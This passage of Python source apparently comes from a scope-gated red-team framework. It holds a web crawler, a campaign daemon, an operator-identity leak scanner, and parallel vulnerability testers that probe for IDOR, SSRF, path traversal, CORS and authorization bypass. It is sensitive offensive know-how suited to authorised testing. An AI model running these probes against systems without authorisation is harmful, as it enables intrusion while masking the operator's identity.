            surge_age = (_dt.now(_tz.utc) - _dt.fromtimestamp(sp.stat().st_mtime, _tz.utc)).days
        except Exception:
            pass
        top = Counter((r.get("cat") or "?").split("/")[0] for r in cat)
        mode = Counter(r.get("mode") for r in cat)
        src = Counter(r.get("src", "curated") for r in cat)
        surge_src = Counter(r.get("src", "?") for r in surge)
        if getattr(args, "json", False):
            print(json.dumps({"entries": len(cat), "surge_entries": len(surge),
                              "total": len(cat) + len(surge),
                              "surge_by_src": dict(surge_src),
                              "by_top": dict(top.most_common()),
                              "by_mode": dict(mode), "by_src": dict(src),
                              "surge_age_days": surge_age,
                              "note": "metadata only — execution via arsenal (scope-gated)"},
                             indent=2))
            return 0
        print(f"═══ KNOWN TOOL CATALOG — {len(cat)} tools + {len(surge)} surge = {len(cat) + len(surge)} ═══")
        print("  reference index · nothing here executes · arsenal fires installed tools, scope-gated")
        for k, v in top.most_common():
            print(f"  {k:12s} {v}")
        print(f"  mode: {dict(mode)} · source: {dict(src)}")
        for k, v in surge_src.most_common():
            print(f"  surge {k:18s} {v}")
        if surge_age is not None:
            mark = "✓ fresh" if surge_age <= 14 else f"⚠ STALE ({surge_age}d) — run: python3 scripts/catalog_surge.py"
            print(f"  surge age: {surge_age}d {mark}")
        return 0

    if action == "categories":
        from collections import Counter
        c = Counter(r.get("cat") for r in _filtered(cat))
        if getattr(args, "json", False):
            print(json.dumps({"categories": [{"cat": k, "count": v}
                                             for k, v in c.most_common()]}, indent=2))
            return 0
        for k, v in c.most_common():
            print(f"  {k:24s} {v}")
        return 0

    if action == "list":
        rows = _filtered(cat)
        total = len(rows)
        rows = rows[:limit]
        if getattr(args, "json", False):
            print(json.dumps({"count": total, "limit": limit, "tools": _rows(rows)}, indent=2))
            return 0
        print(f"═══ CATALOG — {total} matching (showing {len(rows)}, --limit to raise) ═══")
        for r in rows:
            print(f"  {r['name']:28s} [{r.get('cat')}] {r.get('desc')}")
        print("  info only — arsenal fires installed tools, scope-gated")
        return 0

    if action == "search":
        q = term.lower().strip()
        if not q:
            raise UsageError("catalog search needs a term")
        rows = [r for r in cat
                if q in (r.get("name") or "").lower()
                or q in (r.get("desc") or "").lower()
                or q in (r.get("cat") or "").lower()]
        # v7.0 surge fall-through: the public corpora answer when curated is thin
        if len(rows) < limit:
            seen = {(r.get("name") or "").lower() for r in rows}
            for r in _catalog_surge():
                if len(rows) >= limit:
                    break
                nm = (r.get("name") or "").lower()
                if nm in seen:
                    continue
                if q in nm or q in (r.get("desc") or "").lower() or q in (r.get("cat") or "").lower():
                    rows.append(r)
                    seen.add(nm)
        rows = _filtered(rows)
        total = len(rows)
        rows = rows[:limit]
        if getattr(args, "json", False):
            print(json.dumps({"term": term, "count": total, "limit": limit,
                              "tools": _rows(rows)}, indent=2))
            return 0
        print(f"═══ CATALOG SEARCH '{term}' — {total} hit(s) ═══")
        for r in rows:
            print(f"  {r['name']:28s} [{r.get('cat')}] {r.get('desc')}")
        return 0

    if action == "show":
        q = term.lower().strip()
        if not q:
            raise UsageError("catalog show needs a tool name")
        exact = [r for r in cat if (r.get("name") or "").lower() == q]
        r = (exact or [r for r in cat if q in (r.get("name") or "").lower()] or [None])[0]
        if not r:
            surge = _catalog_surge()
            exact = [s for s in surge if (s.get("name") or "").lower() == q]
            r = (exact or [s for s in surge if q in (s.get("name") or "").lower()] or [None])[0]
        if not r:
            print(f"✗ catalog: no tool named '{term}'", file=sys.stderr)
            return 1
        if getattr(args, "json", False):
            print(json.dumps({"tool": _rows([r])[0]}, indent=2))
            return 0
        print(f"═══ {r['name']} ═══")
        print(f"  category : {r.get('cat')}")
        print(f"  mode     : {r.get('mode')}")
        print(f"  source   : {r.get('src', 'curated')}")
        print(f"  about    : {r.get('desc')}")
        how = _rows([r])[0].get("how")
        if how:
            print(f"  how      : {how}")
        print("  NOTE: reference only — execution goes through `arsenal` (scope-gated)")
        return 0

    raise UsageError(f"catalog: unknown action '{action}'")


def cmd_watch(args):
    """THE UNATTENDED RUNNER — the campaign daemon: every cycle = one kernel
    loop pass + the war report + estate memory + an optional notify command.
    Re-engages the SAME estate using its memory (the growth loop, on a clock)."""
    print(f"═══ SPYDERMONKEY WATCH — '{args.target}' every {args.every_mins} min "
          f"(max {args.max_cycles or '∞'} cycle(s)) ═══")
    sm = str(Path(__file__).resolve())
    cycle = 0
    while True:
        cycle += 1
        print(f"\n▸ cycle {cycle}: the loop pass")
        r = subprocess.run([sys.executable, sm, "loop", "--target", args.target,
                            "--url", args.url, "--domain", args.domain,
                            "--max-steps", str(args.max_steps)]
                           + (["--trace-file", args.trace_file]
                              if getattr(args, "trace_file", None) else []),
                           timeout=args.cycle_timeout * 60)
        if r.returncode not in (0, 5):
            print(f"  ⚠ loop exited {r.returncode} — watch continues (the walls held)")
        subprocess.run([sys.executable, sm, "report", "--target", args.target])
        mem = _estate_memory(args.target)
        print(f"  ▸ estate memory: {', '.join(mem.get('classes', [])) or 'nothing confirmed yet'}")
        if args.notify_cmd:
            subprocess.run(args.notify_cmd.split() +
                           [f"spydermonkey watch cycle {cycle} done: "
                            f"{len(_ledger_load(args.target))} findings"], timeout=60)
        if args.max_cycles and cycle >= args.max_cycles:
            print(f"═══ watch complete: {cycle} cycle(s) ═══")
            return 0
        time.sleep(args.every_mins * 60)


def cmd_serve(args):
    """THE WAR BOARD — the family's localhost dashboard: campaigns, the ledger,
    chains, the 13-phase board, kernel steps, estate memory. Bound to 127.0.0.1
    ONLY (the wall: the board never faces the network)."""
    from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

    class Board(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _send(self, code, body, ctype="text/html"):
            b = body.encode()
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)

        def do_GET(self):
            if self.path == "/":
                camp_root = Path.home() / ".redteam" / "campaigns"
                camps = ([d.name for d in camp_root.iterdir() if d.is_dir()]
                         if camp_root.exists() else [])
                rows = "".join(f'<a href="/{c}">{c}</a><br>' for c in camps) or "no campaigns"
                self._send(200, f"<html><head><title>SPYDERMONKEY</title></head>"
                                f"<body style='background:#0d1117;color:#e6edf3;"
                                f"font-family:monospace'><h1>🕷 SPYDERMONKEY — war board</h1>"
                                f"<h3>{len(camps)} campaign(s)</h3>{rows}</body></html>")
                return
            parts = self.path.strip("/").split("/")
            target = parts[0]
            if len(parts) == 2 and parts[1] == "json":
                rows = _ledger_load(target)
                self._send(200, json.dumps({"target": target, "findings": rows,
                                            "chains": _load_json(
                                                _camp(target) / "chain-state.json", {}),
                                            "phases": _load_json(
                                                _camp(target) / "phases-state.json", {}),
                                            "kernel": _kernel_state(target),
                                            "estate": _estate_memory(target)},
                                           indent=2), "application/json")
                return
            rows = _ledger_load(target)
            chains = _load_json(_camp(target) / "chain-state.json", {}).get("chains", [])
            mem = _estate_memory(target)
            tr = "".join(f"<tr><td>{r['id']}</td><td>{r['cls']}</td>"
                         f"<td style='color:{'#3fb950' if r['status'] == 'CONFIRMED' else '#d29922'}'>"
                         f"{r['status']}</td><td>{r['severity']}</td>"
                         f"<td>{r['title'][:60]}</td></tr>" for r in rows)
            ch = "".join(f"<li>{c['id']} [{c['pattern']}] {c['severity']} — "
                         f"{c['impact'][:80]}</li>" for c in chains) or "<li>—</li>"
            self._send(200,
                       f"<html><head><title>{target} — war board</title></head>"
                       f"<body style='background:#0d1117;color:#e6edf3;font-family:monospace'>"
                       f"<h1>🕷 {target} — war board</h1>"
                       f"<h2>ledger ({len(rows)})</h2><table border=1 cellpadding=4>"
                       f"<tr><th>id</th><th>class</th><th>status</th><th>sev</th>"
                       f"<th>title</th></tr>{tr}</table>"
                       f"<h2>chains ({len(chains)})</h2><ul>{ch}</ul>"
                       f"<h2>estate memory</h2><p>{', '.join(mem.get('classes', [])) or '—'}</p>"
                       f"<p><a href='/{target}/json' style='color:#58a6ff'>json</a></p>"
                       f"</body></html>")

    srv = ThreadingHTTPServer(("127.0.0.1", args.port), Board)
    print(f"═══ SPYDERMONKEY WAR BOARD — http://127.0.0.1:{args.port} (localhost only) ═══")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        srv.shutdown()
        print("▸ board closed")
    return 0


def _estate_write_from_ledger(target):
    """The growth loop's write side: every completed engagement updates the
    estate memory — confirmed classes, counts, dates. The next campaign on this
    target plans with it."""
    mem = _estate_memory(target)
    rows = _ledger_load(target)
    confirmed = sorted({r["cls"] for r in rows if r.get("status") == "CONFIRMED"})
    mem.setdefault("classes", [])
    for c in confirmed:
        if c not in mem["classes"]:
            mem["classes"].append(c)
    mem.setdefault("history", []).append(
        {"at": _now(), "kind": "engagement", "confirmed": confirmed,
         "findings": len(rows)})
    _estate_save(target, mem)
    return confirmed


def cmd_protect(args):
    """SELF-PROTECTION — the family guards the OPERATOR: scans every campaign
    artifact for operator-identifying strings (whoami · hostname · LAN IPs ·
    git email · home paths), verifies wipes, and emits the kage-style detection
    rule for every leak class found. The mirror turned on ourselves."""
    import getpass
    import socket as sk
    if args.action == "posture":
        ident = {
            "user": getpass.getuser(),
            "hostname": sk.gethostname(),
            "home": str(Path.home()),
            "emails": [],
            "ips": [],
        }
        gitcfg = Path.home() / ".gitconfig"
        if gitcfg.exists():
            ident["emails"] = re.findall(r"email\s*=\s*(\S+@\S+)",
                                         gitcfg.read_text(errors="replace"))
        try:
            r = subprocess.run(["hostname", "-I"], capture_output=True, text=True, timeout=5)
            ident["ips"] = [ip for ip in r.stdout.split() if _is_ip(ip)]
        except Exception:
            pass
        if _json_mode(args):
            _emit(args, ident)
            return 0
        print("═══ OPERATOR POSTURE (what this machine can leak) ═══")
        print(f"  user: {ident['user']} · host: {ident['hostname']}")
        print(f"  home: {ident['home']}")
        print(f"  git emails: {', '.join(ident['emails']) or '—'}")
        print(f"  LAN IPs: {', '.join(ident['ips'][:6]) or '—'}")
        print("  (protect scan --all-campaigns finds every one of these in the artifacts)")
        return 0
    camp_root = Path.home() / ".redteam" / "campaigns"
    targets = ([args.target] if args.target and not args.all_campaigns
               else [d.name for d in camp_root.iterdir() if d.is_dir()]
               if camp_root.exists() else [])
    ident = {"user": getpass.getuser(), "hostname": sk.gethostname(),
             "home": str(Path.home())}
    gitcfg = Path.home() / ".gitconfig"
    if gitcfg.exists():
        ident["emails"] = re.findall(r"email\s*=\s*(\S+@\S+)",
                                     gitcfg.read_text(errors="replace"))
    else:
        ident["emails"] = []
    try:
        r = subprocess.run(["hostname", "-I"], capture_output=True, text=True, timeout=5)
        ident["ips"] = [ip for ip in r.stdout.split() if _is_ip(ip)]
    except Exception:
        ident["ips"] = []
    needles = ([ident["user"], ident["hostname"], ident["home"]]
               + ident.get("emails", []) + ident.get("ips", []))
    leaks = []
    scanned = 0
    for t in targets:
        cdir = camp_root / t
        for f in cdir.rglob("*"):
            if not f.is_file() or f.suffix not in (".md", ".json", ".jsonl", ".txt"):
                continue
            try:
                text = f.read_text(errors="replace")
            except Exception:
                continue
            scanned += 1
            for n in needles:
                if n and n in text:
                    leaks.append({"campaign": t, "file": f.name,
                                  "kind": ("git-email" if "@" in n else
                                           "lan-ip" if _is_ip(n) else
                                           "home-path" if n == ident["home"] else
                                           "identity"),
                                  "string": n[:20]})
    st = {"scanned_files": scanned, "leaks": leaks, "at": _now()}
    outdir = camp_root / (args.target or "protect")
    outdir.mkdir(parents=True, exist_ok=True)
    (outdir / "protect-state.json").write_text(json.dumps(st, indent=2) + "\n")
    if _json_mode(args):
        _emit(args, st)
        return 0 if not leaks else 1
    print(f"═══ SELF-PROTECTION SCAN — {scanned} artifact(s) across {len(targets)} campaign(s) ═══")
    by_kind = {}
    for l in leaks:
        by_kind[l["kind"]] = by_kind.get(l["kind"], 0) + 1
        print(f"  ⚠ {l['campaign']}/{l['file']}: {l['kind']} leak ({l['string']}…)")
    print(f"═══ {len(leaks)} operator-string leak(s) "
          f"({', '.join(f'{k}={v}' for k, v in by_kind.items()) or 'clean'}) ═══")
    if leaks:
        print("  ▸ kage rule for the leak class: artifact hygiene — strip operator strings")
        print("    (barbican sanitize owns the strip; protect PROVES it's clean)")
        return 1
    print("  ✓ operator-identifying strings: ZERO in the family's artifacts")
    return 0


# ════════════════════════════════════════════════════════════════════════════
# v4.1 THE SURFACE ENGINE — the kernel discovers its own attack surface ───────

_JS_PATH_RE = re.compile(
    r"""(?:fetch\(|axios[.(]|url\s*[:=]\s*|api\s*[:=]\s*)["'`](/[a-zA-Z0-9_\-./]{2,60})["'`]""")
_FORM_INPUT_RE = re.compile(
    r"<input[^>]+name=[\"']([a-zA-Z0-9_\-]{1,40})[\"']", re.I)
_FORM_BLOCK_RE = re.compile(r"<form\b([^>]*)>((?:(?!</form>).)*)</form>", re.I | re.S)
_A_HREF_RE = re.compile(r'href=[\'"]([^#\'"]{2,200})[\'"]', re.I)
_FORM_ACTION_RE = re.compile(r'<form[^>]+action=[\'"]([^\'"]{2,200})[\'"]', re.I)
_PAGE_CAP = 20


def cmd_crawl(args):
    """THE SURFACE ENGINE (HackBrowser-equivalent, stdlib): same-origin BFS
    crawl → links · forms · query params · JS-mined API paths → the session
    context AUTO-FILLS. The testers strike what this finds — no hand-fed urls."""
    json_mode = _json_mode(args)
    depth = max(1, min(int(getattr(args, "depth", 2) or 2), 4))
    base = args.url if "://" in args.url else "http://" + args.url
    if not _scope_gate(base, quiet=json_mode):
        return 1
    from urllib.parse import urlsplit, urljoin, parse_qsl, urlencode
    origin = "{0.scheme}://{0.netloc}".format(urlsplit(base))
    seen, queue, mined = {base}, [base], []
    post_forms = []
    pages = 0
    while queue and pages < _PAGE_CAP:
        url = queue.pop(0)
        sp = urlsplit(url)
        if "{0.scheme}://{0.netloc}".format(sp) != origin:
            continue
        r = _http(url, timeout=max(2, min(int(getattr(args, "timeout", 8) or 8), 30)))
        if r["status"] != 200 or r["body"].startswith("__error__"):
            continue
        pages += 1
        body = r["body"]
        # links → the queue (v5.1.2: a linked page IS surface — mine it as an
        # endpoint with its query skeleton, so param-less routes land too)
        for href in _A_HREF_RE.findall(body):
            nxt = urljoin(url, href.split("#")[0])
            if nxt.startswith(origin) and nxt not in seen and len(seen) < _PAGE_CAP * 3:
                seen.add(nxt)
                queue.append(nxt)
                nsp = urlsplit(nxt)
                mined.append((origin + nsp.path,
                              [k for k, _ in parse_qsl(nsp.query,
                                                       keep_blank_values=True)]))
        # forms → endpoints with param skeletons (v5.1: the WHOLE form block —
        # method + every input — so POST surfaces feed the mass-assign tester)
        for fmatch in _FORM_BLOCK_RE.finditer(body):
            open_tag, inner = fmatch.group(1), fmatch.group(2)
            action_m = re.search(r"action=[\"']([^\"']{2,200})[\"']", open_tag)
            action = action_m.group(1) if action_m else url
            method_m = re.search(r"method=[\"']([a-z]+)[\"']", open_tag, re.I)
            method = (method_m.group(1) if method_m else "get").lower()
            fields = re.findall(r"name=[\"']([a-zA-Z0-9_\-]{1,40})[\"']", inner)
            mined.append((urljoin(url, action.split("?")[0]), fields))
            if method == "post":
                post_forms.append(urljoin(url, action.split("?")[0]))
        # query params already on visited urls
        for k, _ in parse_qsl(sp.query, keep_blank_values=True):
            mined.append((url, [k]))
        # JS api-path mining
        for m in _JS_PATH_RE.findall(body):
            mined.append((urljoin(url, m), []))
    # dedupe into endpoint skeletons: path + ordered param names
    eps = {}
    for path, inputs in mined:
        sp = urlsplit(path)
        if sp.path in ("/", ""):
            continue
        params = list(dict.fromkeys(
            [k for k, _ in parse_qsl(sp.query, keep_blank_values=True)]
            + [n if isinstance(n, str) else n[0] for n in inputs]))
        key = sp.path
        eps[key] = sorted(set(eps.get(key, []) + params))
    endpoint_rows = []
    camp = _camp(args.target)
    _ensure_campaign(args.target)
    ctx = _load_json(camp / "context.json", {"endpoints": [], "roles": [],
                                             "credentials": [], "functions": []})
    for path in sorted(eps):
        params = eps[path]
        skel = path + ("?" + "&".join(f"{p}=" for p in params) if params else "")
        endpoint_rows.append({"path": sp2_path(path), "skeleton": skel,
                              "params": params})
        if skel not in ctx["endpoints"] and len(ctx["endpoints"]) < 100:
            ctx["endpoints"].append(skel)
    import os as _os
    tmp = camp / "context.json.tmp"
    tmp.write_text(json.dumps(ctx, indent=2) + "\n")
    _os.replace(tmp, camp / "context.json")
    (camp / "crawl-state.json").write_text(json.dumps(
        {"target": args.target, "base": base, "pages": pages,
         "endpoints": endpoint_rows, "post_forms": sorted(set(post_forms)),
         "depth": depth, "at": _now()}, indent=2) + "\n")
    payload = {"target": args.target, "base": base, "pages_crawled": pages,
               "urls_seen": len(seen), "endpoints": len(endpoint_rows),
               "post_forms": len(set(post_forms)),
               "params": sorted({p for e in endpoint_rows for p in e["params"]}),
               "context_updated": True}
    if json_mode:
        _emit(args, payload)
        return 0
    print(f"═══ SURFACE MAP — {base} ═══")
    print(f"  ▸ crawled {pages} page(s) · {len(seen)} url(s) seen · "
          f"{len(endpoint_rows)} endpoint(s) mined")
    for e in endpoint_rows[:15]:
        print(f"    · {e['skeleton'][:90]}" + (f"  [{','.join(e['params'][:6])}]"
                                               if e["params"] else ""))
    print(f"  ▸ context.endpoints autofilled — testers now strike the mined surface")
    return 0


def sp2_path(path):
    from urllib.parse import urlsplit
    return urlsplit(path).path or path


def cmd_testers(args):
    if not args.demo and not args.url:
        print("✗ testers need --url U (repeatable; declared targets) or --demo (lab replica)",
              file=sys.stderr)
        return 2
    json_mode = _json_mode(args)
    srv = None
    if args.demo:
        srv, base = _demo_replica()
        args.url = [base + "/api/orders?org_id=acme",
                    base + "/search?q=hello",
                    base + "/file?path=etc",
                    base + "/fetch?url=http://example.com",
                    base + "/api/token?token=abc",
                    base + "/api/coupon?amount=5",
                    base + "/role?role=user",
                    base + "/api/user?name=bob&email=bob@lab",
                    base + "/redirect?next=/home",
                    base + "/api/data",
                    base + "/api/login2?user=admin&pass=y",
                    base + "/greet?name=bob",
                    base + "/api/webhook"]
        if not json_mode:
            print("▸ demo mode: built-in lab replica serving (self-terminating at exit)")
    urls = [u for u in (args.url or []) if u]
    camp = _camp(args.target)
    ctx = _load_json(camp / "context.json", {})
    endpoints = ctx.get("endpoints", [])
    if endpoints and not args.demo and urls:
        urls = [u if "://" in u else urls[0].rstrip("/") + u for u in endpoints] or urls
    for u in urls:
        if not _scope_gate(u, quiet=json_mode):
            if srv:
                srv.shutdown()
            return 1
    timeout = max(1, min(int(getattr(args, "timeout", 8) or 8), 30))
    results = {}
    if not json_mode:
        print(f"═══ SPYDERMONKEY TESTERS — {len(TESTERS)} sub-testers in PARALLEL over {len(urls)} url(s) ═══")

    def run_tester(t):
        from urllib.parse import urlsplit, parse_qsl, urlencode, urlunsplit
        hits = []
        probed_roots: set = set()
        for u in urls:
            sp = urlsplit(u)
            params = dict(parse_qsl(sp.query, keep_blank_values=True))
            base = urlunsplit((sp.scheme, sp.netloc, sp.path, "", ""))
            if t["name"] == "MASSASSIGN":
                if not params:
                    continue
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                b1 = _http(base, "POST", data=urlencode(params), headers=headers,
                           timeout=timeout)
                b2 = _http(base, "POST", data=urlencode(params), headers=headers,
                           timeout=timeout)
                a = _http(base, "POST", data=urlencode(params) + t["extra"],
                          headers=headers, timeout=timeout)
                hit, decisive, reason = _tester_verdict(t, t["extra"], b1, a)
                stable = (b1["status"], b1["sha256"]) == (b2["status"], b2["sha256"])
                if not stable:
                    decisive, reason = False, "unstable baseline across control repeats"
                if hit:
                    hits.append({"param": "body", "original": "+base fields",
                                 "payload": t["extra"], "baseline": _gate_brief(b1),
                                 "attack": _gate_brief(a), "url": u,
                                 "decisive": decisive, "reason": reason,
                                 "stable": stable})
                continue
            if t["name"] == "CORS":
                # v5.5.0 — the Origin-reflection differential: the baseline
                # carries a neutral Origin, the attack a foreign one. The
                # Origin header triggers no fetch — this probe is read-only.
                origin = t["attacks"]("")[0]
                b1 = _http(base, headers={"Origin": "https://baseline.probe.invalid"},
                           timeout=timeout)
                a = _http(base, headers={"Origin": origin}, timeout=timeout)
                hit, decisive, reason = _tester_verdict(t, origin, b1, a)
                if hit:
                    hits.append({"param": "Origin", "original": "baseline.probe.invalid",
                                 "payload": origin, "baseline": _gate_brief(b1),
                                 "attack": _gate_brief(a), "url": u,
                                 "decisive": decisive, "reason": reason,
                                 "stable": True})
                continue
            if t["name"] in ("HARVEST", "DIRECTORY"):
                # v5.5.0 — the path-probe differential: a guaranteed-missing
                # control path is the baseline; each candidate path is the
                # attack. A soft-404 target answers both identically and
                # registers NOTHING (the early identical-response gate).
                # Paths are origin-relative — each distinct ORIGIN is probed
                # once, not once per URL (13 urls on one host = one sweep).
                root = urlunsplit((sp.scheme, sp.netloc, "/", "", ""))
                if root in probed_roots:
                    continue
                probed_roots.add(root)
                ctrl = _http(root + "__spydermonkey_control__", timeout=timeout)
                for path in t["paths"]:
                    a = _http(root + path, timeout=timeout)
                    hit, decisive, reason = _tester_verdict(t, path, ctrl, a)
                    if hit:
                        hits.append({"param": "path", "original": "(none)",
                                     "payload": "/" + path,
                                     "baseline": _gate_brief(ctrl),
                                     "attack": _gate_brief(a), "url": root,
                                     "decisive": decisive, "reason": reason,
                                     "stable": True})
                continue
            if t["name"] == "REPLAY":
                # v5.5.0 — the idempotency differential: the SAME logical
                # request fired twice (N=2, validation-only). A countable
                # effect that increments is the proof.
                b1 = _http(u, timeout=timeout)
                a = _http(u, timeout=timeout)
                hit, decisive, reason = _tester_verdict(t, "(replay)", b1, a)
                if hit:
                    hits.append({"param": "replay", "original": "request #1",
                                 "payload": "request #2 (identical)",
                                 "baseline": _gate_brief(b1),
                                 "attack": _gate_brief(a), "url": u,
                                 "decisive": decisive, "reason": reason,
                                 "stable": True})
                continue
            for p in t["params"]:
                if p not in params:
                    continue
                orig = params[p]
                # v4.1 — the two-role AUTHZ differential (CyberStrike's role &
                # credential discovery, family-native): the context's FIRST
                # credential is the privileged baseline, the SECOND is the
                # low-priv attack. A 200-with-different-body on the low role
                # is the authorization-bypass proof.
                if t["name"] == "AUTHZ" and p == t["params"][0]:
                    creds = [c for c in (ctx.get("credentials") or []) if ":" in c]
                    if len(creds) >= 2:
                        hi, lo = creds[0], creds[1]
                        h_tok, l_tok = hi.split(":", 1)[1], lo.split(":", 1)[1]
                        hb = _http(base + "?" + urlencode(params), timeout=timeout,
                                   headers={"Authorization": f"Bearer {h_tok}"})
                        ha = _http(base + "?" + urlencode(params), timeout=timeout,
                                   headers={"Authorization": f"Bearer {l_tok}"})
                        hit = (ha["status"] == 200 and hb["status"] == 200
                               and (hb["status"], hb["sha256"]) != (ha["status"], ha["sha256"]))
                        if hit:
                            hits.append({"param": f"auth({lo.split(':')[0]})",
                                         "original": f"Bearer {h_tok[:12]}…",
                                         "payload": f"Bearer {l_tok[:12]}…",
                                         "baseline": _gate_brief(hb),
                                         "attack": _gate_brief(ha), "url": u,
                                         "decisive": True,
                                         "reason": "low-priv credential received a "
                                                   "different 200 body on the same route",
                                         "stable": True})
                        continue
                for atk in t["attacks"](orig):
                    b1 = _http(base + "?" + urlencode({**params, p: orig}), timeout=timeout)
                    b2 = _http(base + "?" + urlencode({**params, p: orig}), timeout=timeout)
                    a = _http(base + "?" + urlencode({**params, p: atk}), timeout=timeout)
                    hit, decisive, reason = _tester_verdict(t, atk, b1, a)
                    stable = (b1["status"], b1["sha256"]) == (b2["status"], b2["sha256"])
                    if not stable:
                        decisive, reason = False, "unstable baseline across control repeats"
                    elif not hit and t["name"] in ("SSRF", "REDIRECT"):
                        # a redirect-class finding can live in the Location header
                        # alone (302 with a swapped target) — body-diff misses it
                        bl = (b1.get("headers") or {}).get("location", "")
                        al = (a.get("headers") or {}).get("location", "")
                        if bl and al and bl != al:
                            hit, decisive, reason = True, True, \
                                f"302 Location swapped: {bl[:30]} → {al[:40]}"
                    if hit:
                        hits.append({"param": p, "original": orig, "payload": atk,
                                     "baseline": _gate_brief(b1),
                                     "attack": _gate_brief(a), "url": u,
                                     "decisive": decisive, "reason": reason,
                                     "stable": stable})
        results[t["name"]] = hits

    threads = [threading.Thread(target=run_tester, args=(t,), daemon=True)
               for t in TESTERS]
    for th in threads:
        th.start()
    for th in threads:
        th.join()
    produced = confirmed = hypotheses = total = 0
    out_rows = []
    for t in TESTERS:
        hits = results.get(t["name"], [])
        total += len(hits)
        decisive_hits = [h for h in hits if h["decisive"]]
        chosen = decisive_hits[0] if decisive_hits else (hits[0] if hits else None)
        ledger_id = None
        if chosen:
            produced += 1
            if chosen["decisive"]:
                confirmed += 1
            else:
                hypotheses += 1
            proof = (f"baseline: {chosen['baseline']['status']} "
                     f"len={chosen['baseline']['length']} (param {chosen['param']}="
                     f"{chosen['original']}); attack: {chosen['attack']['status']} "
                     f"len={chosen['attack']['length']} (param {chosen['param']}="
                     f"{chosen['payload']}); diff: {chosen['reason']}; "
                     f"control: baseline stable={chosen['stable']}")
            title = f"{t['name']} differential on param '{chosen['param']}'"
            sev = "high" if t["cls"] in ("IDOR", "SSRF", "TRAVERSAL", "AUTHN") else "medium"
            entry = _cmd_ledger_internal(
                args.target, title, t["cls"], chosen["url"], sev, proof,
                force_hypothesis=not chosen["decisive"], quiet=True)
            ledger_id = entry.get("id") if isinstance(entry, dict) else None
            chosen["ledger_id"] = ledger_id
            if not json_mode:
                mark = "✓" if chosen["decisive"] else "⚠"
                print(f"  {mark} {t['name']:10s} {len(hits)} differential(s)"
                      f" · {'CONFIRMED' if chosen['decisive'] else 'HYPOTHESIS'}"
                      f" ({chosen['reason']}) → ledger {ledger_id or '?'}")
                print(f"      {chosen['param']}={chosen['original']!r}→"
                      f"{chosen['payload']!r}: {chosen['baseline']['status']}/"
                      f"{chosen['baseline']['length']}B → {chosen['attack']['status']}/"
                      f"{chosen['attack']['length']}B")
        elif not json_mode:
            print(f"  · {t['name']:10s} no differential (no matching param or identical responses)")
        out_rows.append({"name": t["name"], "cls": t["cls"], "logic": t["logic"],
                         "hits": hits[:20], "hit_count": len(hits),
                         "decisive": bool(decisive_hits),
                         "ledger_id": ledger_id})
    payload = {"target": args.target, "urls": len(urls), "testers": out_rows,
               "produced": produced, "confirmed": confirmed,
               "hypotheses": hypotheses, "differentials": total,
               "demo": bool(args.demo), "ok": True}
    if json_mode:
        _emit(args, payload)
    else:
        print(f"═══ {produced}/{len(TESTERS)} tester(s) produced findings · {confirmed} confirmed"
              f" · {hypotheses} hypothesis · {total} differential(s)"
              f" · deduped into the ledger ═══")
    if srv:
        srv.shutdown()
    return 0


# ── 3.7 coverage + report ─────────────────────────────────────────────────────

def cmd_coverage(args):
    camp = _camp(args.target)
    _ensure_campaign(args.target)
    rows = _ledger_load(args.target)
    hist = {}
    for r in rows:
        hist[r.get("cls", "?")] = hist.get(r.get("cls", "?"), 0) + 1
    board = _phase_board(args.target)
    gaps = [{"phase": r["id"], "mandate": r["mandate"], "status": r["status"],
             "deliverable": r["deliverable"]} for r in board
            if r["status"] != "completed"]
    chains = _load_json(camp / "chain-state.json", {}).get("chains", [])
    payload = {
        "target": args.target,
        "phases": board,
        "complete": len(board) - len(gaps),
        "total": len(board),
        "percent": round(100.0 * (len(board) - len(gaps)) / len(board), 1) if board else 0.0,
        "ledger_rows": len(rows),
        "severity_histogram": _ledger_stats(rows)["by_severity"],
        "class_histogram": hist,
        "chains": len(chains),
        "gaps": gaps,
        "next_mandates": list(dict.fromkeys(g["mandate"] for g in gaps)),
    }
    if _json_mode(args):
        _emit(args, payload)
        return 0
    print(f"═══ COVERAGE — engagement '{args.target}' ═══")
    for r in board:
        mark = {"completed": "✓", "in_progress": "▸", "blocked": "·"}.get(r["status"], "·")
        print(f"  {mark} {r['id']:22s} [{r['status']:11s}] via {r['mandate']}")
    print(f"  findings histogram: {', '.join(f'{k}={v}' for k, v in sorted(hist.items())) or '—'}")
    print(f"  chain candidates: {len(chains)} · ledger rows: {len(rows)}")
    print(f"  gaps: {', '.join(g['phase'] for g in gaps) or 'none — full coverage'}")
    if gaps:
        print(f"  next mandates: {' → '.join(payload['next_mandates'])}")
    return 0


# ── v5.6.0 THE REASONING ENGINE ──────────────────────────────────────────────

def cmd_hypothesis(args):
    """THE REASONING ENGINE — the family's datasets → ranked, wall-checked
    hypothesis cards that guide ANY model toward unconfirmed vulnerability
    instances. Generation is offline reasoning (no live fire); every card's
    execution still goes through the same scope authority and 3-gate engine."""
    import hypothesis as hy
    camp = _camp(args.target)
    _ensure_campaign(args.target, url=getattr(args, "url", None))
    state = hy.load_state(camp)
    kinds = tuple(k.strip() for k in (args.kinds or
                 "surface,cve-map,variant,chain").split(",") if k.strip())
    out = hy.generate(state, args.target, url=getattr(args, "url", None),
                      kinds=kinds)
    cards = out["cards"]

    # the wall, in code: a card whose asset is a URL must pass the scope gate
    # or it is marked scope-blocked (execution would refuse anyway — marking
    # it here keeps the model from wasting a turn on it)
    for c in cards:
        asset = c.get("asset") or ""
        if asset.startswith(("http://", "https://")):
            ok, _reason, _ = sa.check(asset, strict=True, audit=False,
                                      allow_lab=True)
            c["scope"] = "ok" if ok else "blocked"
        else:
            c["scope"] = "ok"
    blocked = sum(1 for c in cards if c.get("scope") == "blocked")

    # persist the generation + mark what is new since the last one; a card
    # already FIRED keeps its verdict/status across regeneration (regenerating
    # must never make the engine re-fire the same hypothesis)
    prev = _load_json(camp / "hypothesis-state.json", {"cards": []})
    prev_by_key = {(p.get("kind"), p.get("cls"), p.get("asset"), p.get("title")):
                   p for p in prev.get("cards", [])}
    seen = {(p.get("cls"), p.get("asset"), p.get("kind"))
            for p in prev.get("cards", [])}
    for c in cards:
        old = prev_by_key.get((c["kind"], c["cls"], c.get("asset"), c.get("title")))
        if old and old.get("status"):
            c["status"] = old["status"]
            c["finding"] = old.get("finding")
